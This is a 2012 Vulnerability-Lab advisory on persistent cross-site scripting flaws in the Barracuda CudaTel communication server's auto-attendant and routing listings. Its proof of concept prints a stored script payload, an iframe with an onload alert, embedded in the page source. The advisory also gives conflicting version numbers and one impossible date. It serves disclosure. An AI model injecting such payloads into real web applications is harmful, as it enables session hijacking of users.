Title:
======
Barracuda CudaTel v2.0.029.1 - Multiple Web Vulnerabilities


Date:
=====
2012-03-08


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=442


VL-ID:
=====
442


Introduction:
=============
Designed to enable seamless voice and video communication, the CudaTel Communication Server is an easy-to-use, 
affordable, next-generation phone system for businesses. CudaTel Communication Server s enterprise-class 
feature set includes Voice over IP (VoIP) PBX services, conferencing, follow-me, automated attendant services, 
and more, controlled by an easy-to-use Web interface. CudaTel Communication Server is compatible with any SIP 
device and provider, and can be pre-configured for use with both analog and digital telephone networks. Powerful, 
Complete Solution With an expansive feature set and and no per user or phone licensing fees, the CudaTel 
Communication Server is equipped and priced for organizations of any size. Native High Definition audio support 
and integrated phone line (TDM) hardware produces an unparalleled audio experience. VOIP encryption protects calls 
from hackers and digital eavesdroppers.

(Copy of the Vendor Homepage: http://www.barracudanetworks.ca/cudatel.aspx )


Abstract:
=========
Vulnerability Lab Team discovered  multiple persistent Web Vulnerabilities on Barracudas CudaTel Phone Application v3.0.028.001.


Report-Timeline:
================
2012-02-19:	Vendor Notification
2012-02-00:	Vendor Response/Feedback
2012-03-07:	Vendor Fix/Patch by Check
2012-03-08:	Public or Non-Public Disclosure


Status:
========
Published


Affected Products:
==================
Barracuda Networks
Product: CudaTel - Communication Server v2.0.029.1


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
Multiple persistent Input Validation vulnerabilities are detected on Barracudas CudaTel Phone Application v3.0.028.001. 
Local low privileged user accounts can implement/inject malicious script code to manipulate modules via persistent context 
requests. When exploited by an authenticated user, the identified vulnerabilities can result in information disclosure via error, 
session hijacking, access to available phone line services, manipulated persistent context execution out of the auto route listings.

Vulnerable Module(s): 
						[+] Automated Attendants
						   [-] Advanced Routing extension - NAME & Listing
						   [-] Auto Attendants - NAME & Listing
						   [-] ALL Types Listing Category


Picture(s):
								../1.png
								../2.png


Proof of Concept:
=================
The vulnerabilities can be exploited by local privileged user accounts with low user inter action or remote via manipulated 
http request & high required user inter action. For demonstration or reproduce ...


Code Review: Listing Category (All; Routing Extension; Auto Attendants)  [EXECUTION OF PERSISTENT SCRIPT CODE]

<td class="detailTD">
<div style="float: left;" class="printedName">
"><iframe div="" <="" onload='alert("VL")' src="a">
</td><script type="text/javascript">extensions_register('extOp530748', 'extOp530748-ext144', {"flag_super":"0","flag_locked":
"0","bbx_extension_rcd":"2012-02-16 
11:21:48.105901","bbx_extension_block_begin":"2088","map"{"bbx_conference_id":null,"bbx_provider_gateway_id":null,"sort_name":
"\"><iframe src=a onload=alert(\"vl\") <","bbx_valet_parking_id":null,"bbx_extension_entity_map_id":"82","bbx_extension_entity_
map_fallback_exten":null,"bbx_
extension_entity_map_metadata":null,"bbx_user_id":null,"bbx_router_id":"20","bbx_group_id":null,"bbx_callflow_id":null,"_force_
row_refresh":"0","show_name":"\"><[EXECUTION OF PERSISTENT SCRIPT CODE]
<","bbx_queue_id":null,"bbx_tdm_card_port_id":null,"flag_standalone":"1","bbx_auto_attendant_id":null,"bbx_extension_id_
forward":null},"bbx_extension_name":null,"bbx_domain_id":"6","bbx_extension_block_end":"2088","type_id":

{"id":"20","type":"router","col":"bbx_router_id"},"map_id":"82","flag_external":"0","flag_voicemail":"0","bbx_extension_value"
:"2088","ldap":0,"bbx_extension_rpd":"2012-02-16 11:21:49.06783","user_synced":null,"printed_name":"\"><[EXECUTION OF PERSISTENT SCRIPT CODE]
<","bbx_extension_id":"144","group_synced":null,"type":"router","flag_auto_provision":"0"});</script>
</tr>


Reference(s):
						   ../poc.3.txt
						   ../review.txt
						   ../vulnerable modules.txt
						   ../CudaTel Communications Server.htm
						   ../CudaTel Communications Server - Listing All.htm


Risk:
=====
The security risk of the persistent script code injection vulnerabilities are estimated as high(-).


Credits:
========
Vulnerability Research Laboratory - Benjamin Kunz Mejri (Rem0ve)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012|Vulnerability-Lab

-- 
Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com

